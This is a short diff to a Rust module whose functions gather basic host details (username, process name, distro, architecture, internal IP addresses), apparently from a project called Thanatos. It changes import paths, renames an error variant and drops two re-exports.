@@ -1,6 +1,6 @@
 use std::io::{BufRead, BufReader};
 
-use errors::ThanatosError;
+use crate::errors::ThanatosError;
 use ffiwrappers::linux::{
     ifaddrs::IfAddrsList,
     socket::SockAddr,
@@ -13,10 +13,8 @@ mod dnsname;
 pub use dnsname::{domain, hostname};
 
 mod integrity;
-pub use integrity::integrity_level;
 
 mod selinux;
-pub use selinux::selinux_enabled;
 
 pub fn container_environment() -> ContainerEnv {
     if let Ok(readdir) = std::fs::read_dir("/") {
@@ -87,7 +85,7 @@ pub fn distro() -> Option<String> {
 pub fn username() -> Result<String, ThanatosError> {
     UserInfo::current_user()
         .map(|userinfo| userinfo.username().to_string())
-        .map_err(ThanatosError::FFIError)
+        .map_err(ThanatosError::FfiError)
 }
 
 pub fn architecture() -> Option<Architecture> {
@@ -99,11 +97,11 @@ pub fn architecture() -> Option<Architecture> {
 }
 
 pub fn process_name() -> Result<String, ThanatosError> {
-    std::fs::read_to_string("/proc/self/comm").map_err(ThanatosError::IoError)
+    std::fs::read_to_string("/proc/self/comm").map_err(|e| ThanatosError::IoError(e.kind()))
 }
 
 pub fn internal_ips() -> Result<Vec<IpType>, ThanatosError> {
-    let interfaces = IfAddrsList::new().map_err(ThanatosError::FFIError)?;
+    let interfaces = IfAddrsList::new().map_err(ThanatosError::FfiError)?;
 
     Ok(interfaces
         .iter()
